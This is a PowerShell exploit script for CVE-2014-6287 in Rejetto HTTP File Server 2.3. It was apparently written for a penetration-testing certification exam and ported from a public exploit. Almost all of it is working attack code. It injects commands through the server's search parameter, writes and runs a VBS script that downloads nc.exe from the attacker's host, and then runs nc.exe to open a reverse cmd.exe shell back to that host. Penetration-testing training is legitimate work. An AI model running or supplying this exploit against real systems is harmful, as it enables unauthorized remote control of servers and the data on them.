<#
.Synopsis
   Script to exploit vulnerability(CVE-2014-6287) in Rejetto Http FileServer 2.3. 

.DESCRIPTION
   The script is a port from Exploit-DB: https://www.exploit-db.com/exploits/39161
   It creates a vbs script on the remote webserver. This script downloads and executes nc.exe to connect back to your local listener.
   You will need your own local webserver hosting nc.exe and a running local listener for the script to work.

.EXAMPLE
  Exploit-Rejetto -TargetIp 10.10.10.5 -TargetPort 80 -LocalIp 10.10.10.4 -LocalPort 8888

.Link
https://www.exploit-db.com/exploits/39161

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-6248

#>
function Exploit-Rejetto {
    [CmdletBinding()]
   
    Param (
        # TargetIp
        [Parameter(Mandatory=$true)]
        [String]
        $TargetIp,

        # Target Port
        [Parameter(Mandatory = $true)]
        [int]
        $TargetPort,

        # Local Ip
        [Parameter(Mandatory = $true)]
        [String]
        $LocalIp,

        #Local Port
        [Parameter(Mandatory = $true)]
        [int]
        $LocalPort
    )

    $WebClient = New-Object Net.WebClient
    $Vbs1 = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ $LocalIp + "%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
    
    $url = "http://" + $TargetIp + ":" + $TargetPort + "/?search=%00{.Save|" + $Vbs1 + ".}"
    $url2 = "http://" + $TargetIp + ":" + $TargetPort + "/?search=%00{.Exec|cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs.}"
    $url3 = "http://" + $TargetIp + ":" + $TargetPort + "/?search=%00{.Exec|C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20" + $LocalIp + "%20" + $LocalPort + ".}"

    Write-Host "Please set up a listener at $LocalIp port $LocalPort" 

    Read-Host -Prompt "Press any key to continue or CTRL+C to quit"
    
    try {
    Invoke-WebRequest -Uri $url -UseBasicParsing |Out-Null
    Write-Host "Uploading script..."
    Invoke-WebRequest -Uri $url2 -UseBasicParsing |Out-Null
    Write-Host "Executing..."
    Invoke-WebRequest -Uri $url3 -UseBasicParsing 
    Write-Host "Connecting back to listener..."
    Write-host "Exploit sucessful! Check your listnener." -ForegroundColor Green
        
    } catch {
    Write-host "An error occured!" -ForegroundColor Red
    }
}
